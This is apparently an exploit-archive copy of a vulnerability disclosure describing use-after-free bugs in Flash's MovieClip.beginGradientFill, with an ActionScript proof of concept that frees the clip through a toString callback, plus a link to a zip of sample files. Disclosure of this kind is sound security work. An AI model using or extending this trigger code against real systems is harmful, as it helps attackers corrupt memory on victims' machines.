@@ -1,0 +1,47 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=557
+
+There are a number of use-after-free vulnerabilities in MovieClip.beginGradientFill. If the spreadMethod or any other string parameter is an object with toString defined, this method can free the MovieClip, which is then used. Note that many parameters to this function can be used to execute script and free the MovieClip during execution, it is recommended that this issues be fixed with a stale pointer check. 
+
+A PoC is as follows:
+
+this.createEmptyMovieClip("bmp_fill_mc", 1);
+with (bmp_fill_mc) {
+	
+	 colors = [0xFF0000, 0x0000FF];
+    fillType = "radial"
+    alphas = [100, 100];
+    ratios = [0, 0xFF];
+	var o = {toString: func};
+    spreadMethod = o;
+    interpolationMethod = "linearRGB";
+    focalPointRatio = 0.9;
+    matrix = new Matrix();
+    matrix.createGradientBox(100, 100, Math.PI, 0, 0);
+    beginGradientFill(fillType, colors, alphas, ratios, matrix, 
+        spreadMethod, interpolationMethod, focalPointRatio);
+    moveTo(100, 100);
+    lineTo(100, 300);
+    lineTo(300, 300);
+    lineTo(300, 100);
+    lineTo(100, 100);
+    endFill();
+}
+
+bmp_fill_mc._xscale = 200;
+bmp_fill_mc._yscale = 200;
+
+function func(){
+	
+	trace("in func");
+	var test = thiz.createTextField("test", 1, 1, 1, 10, 10);
+	trace(test);
+	test.removeTextField();
+	return "reflect";
+	}
+
+A sample swf and fla is attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39022.zip
+
